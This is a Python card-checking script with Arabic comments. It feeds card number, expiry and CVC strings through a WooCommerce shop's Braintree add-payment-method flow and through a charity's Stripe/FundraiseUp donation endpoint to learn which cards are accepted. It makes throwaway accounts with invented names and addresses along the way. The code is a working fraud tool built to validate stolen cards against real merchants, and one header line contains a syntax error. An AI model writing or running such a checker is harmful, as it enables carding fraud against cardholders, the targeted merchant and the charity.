import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
	r = requests.session()
	r.follow_redirects = True
	r.verify = False

	def generate_full_name():
		first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
					   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
					   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
					   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Rasha",
					   "Majid", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
					   "Ali", "Yasmin", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Eman", "Salma"]
		last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
					  "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
					  "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar"]
		full_name = random.choice(first_names) + " " + random.choice(last_names)
		return full_name.split()[0], full_name.split()[1]
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]
		return city, state, street_address, zip_code
			
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = generate_random_account()
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
		return f"{name}{number}"
	username = username()
			
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/', headers=headers)
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	data = {
	     'username': username,
	     'email': acc,
	     'password': 'Ah2002Ah!',
	     'woocommerce-register-nonce': register,
	     '_wp_http_referer': '/my-account/',
	     'register': 'Register',
	 }
	 
	response = r.post('https://www.thevacuumfactory.com/my-account/', headers=headers, data=data)
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    '_ga': 'GA1.1.947412816.1719867681',
	    'wordpress_test_cookie': 'WP%20Cookie%20check',
	}
	
	headers = {
	    'authority': 'www.thevacuumfactory.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.thevacuumfactory.com',
	    'referer': 'https://www.thevacuumfactory.com/my-account/edit-address/billing/',
	    'user-agent': user,
	}
	
	data = {
	    'billing_first_name': first_name,
	    'billing_last_name': last_name,
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': street_address,
	    'billing_address_2': '',
	    'billing_city': city,
	    'billing_state': state,
	    'billing_postcode': zip_code,
	    'billing_phone': '5032580987',
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post('https://www.thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	  
	data = {
	      'action': 'wc_braintree_credit_card_get_client_token',
	      'nonce': client,
	 }
	  
	response = r.post('https://www.thevacuumfactory.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	enc = response.json()['data']
	dec = base64.b64decode(enc).decode('utf-8')
	au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	  
	headers = {
	      'authority': 'payments.braintree-api.com',
	      'accept': '*/*',
	      'authorization': f'Bearer {au}',
	      'braintree-version': '2018-05-10',
	      'cache-control': 'no-cache',
	      'content-type': 'application/json',
	      'pragma': 'no-cache',
	      'user-agent': user,
	  }
	  
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'a8a54511-3469-4ac4-aae6-1b4ce202e438',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
	  tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
	  return
	  
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	  
	data = {
	      'payment_method': 'braintree_credit_card',
	      'wc-braintree-credit-card-card-type': 'master-card',
	      'wc-braintree-credit-card-3d-secure-enabled': '',
	      'wc-braintree-credit-card-3d-secure-verified': '',
	      'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	      'wc_braintree_credit_card_payment_nonce': tok,
	      'wc_braintree_device_data': '',
	      'wc-braintree-credit-card-tokenize-payment-method': 'true',
	      'woocommerce-add-payment-method-nonce': add_nonce,
	      '_wp_http_referer': '/my-account/add-payment-method/',
	      'woocommerce_add_payment_method': '1',
	  }
	  
	response = r.post('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Status code (.*?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if any(x in result.lower() for x in ['funds', 'added', 'charged', 'avs', 'postal', 'approved', 'nice!', 'cvv: gateway rejected: cvv', 'duplicate', 'successful', 'authentication required', 'thank you', 'confirmed', 'successfully', 'invalid_billing_address']):
		return 'Approved'
	else:
		return result


# --- البوابة الجديدة (Stripe عبر FundraiseUp) ---
def stripe(ccx):
	import requests
	ccx = ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	
	if int(yy) < 2000:
		yy = "20" + yy

	user = user_agent.generate_user_agent()

	# 1. طلب إنشاء Payment Method في Stripe
	headers_pm = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': user,
	}

	data_pm = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b14b1ce-a85e-49d8-ac17-4780a5c9798a62d04e&muid=03d149d5-2e89-4baa-b99e-1b1213718cfa487eb3&sid=cdebe41d-9724-492b-bd3d-2512ed4f0215aa032d&pasted_fields=number&payment_user_agent=stripe.js%2F09b245ec49%3B+stripe-js-v3%2F09b245ec49%3B+split-card-element&referrer=https%3A%2F%2Fwww.who.foundation&time_on_page=43545&client_attribution_metadata[client_session_id]=14cab750-14d6-4cb2-8f5d-e3fdb9404331&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=5f78af73-6d70-4515-978e-121519ceb57f&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_1IkRAxH3ux3KMQYE&_stripe_version=2026-02-25.clover'

	try:
		res_pm = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm)
		pm_json = res_pm.json()
		pm_id = pm_json.get('id')
		card_info = pm_json.get('card', {})
		last4 = card_info.get('last4', n[-4:])
		brand = card_info.get('brand', 'unknown')
		country = card_info.get('country', 'US')
		exp_m = card_info.get('exp_month', int(mm))
		exp_y = card_info.get('exp_year', int(yy))
	except Exception as e:
		return f"Error creating PM: {str(e)}"

	if not pm_id:
		err_msg = pm_json.get('error', {}).get('message', 'Declined')
		return err_msg

	# 2. إرسال الدفع عبر FundraiseUp
	headers_pay = {
		'authority': 'api.fundraiseup.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'content-type': 'text/plain; charset=utf-8',
		'origin': 'https://www.who.foundation',
		'referer': 'https://www.who.foundation/',
		'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		'sec-ch-ua-mobile': ?1,
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
		"paymentMethod": {
			"id": pm_id,
			"object": "payment_method",
			"allow_redisplay": "unspecified",
			"billing_details": {
				"address": {"city": None, "country": None, "line1": None, "line2": None, "postal_code": None, "state": None},
				"email": None,
				"name": None,
				"phone": None,
				"tax_id": None
			},
			"card": {
				"brand": brand,
				"brand_product": None,
				"checks": {"address_line1_check": None, "address_postal_code_check": None, "cvc_check": None},
				"country": country,
				"display_brand": brand,
				"exp_month": exp_m,
				"exp_year": exp_y,
				"funding": "debit",
				"generated_from": None,
				"last4": last4,
				"networks": {"available": [brand], "preferred": None},
				"regulated_status": "unregulated",
				"three_d_secure_usage": {"supported": True},
				"wallet": None
			},
			"created": int(time.time()),
			"customer": None,
			"customer_account": None,
			"livemode": True,
			"radar_options": {},
			"shared_payment_granted_token": None,
			"type": "card"
		},
		"embedVersion": "260812-1504"
	}

	try:
		res_pay = requests.post('https://api.fundraiseup.com/paymentSession/9913245918390649216/pay', headers=headers_pay, json=json_data)
		response_text = res_pay.text
		
		# فحص الرد لمعرفة حالة البطاقة
		if any(x in response_text.lower() for x in ['success', 'successfully', 'thank you', 'thanks', 'approved', 'fund', 'succeeded']):
			return 'Approved'
		else:
			# محاولة استخراج رسالة الخطأ إن وجدت
			return response_text[:100]
	except Exception as e:
		return f"Error: {str(e)}"
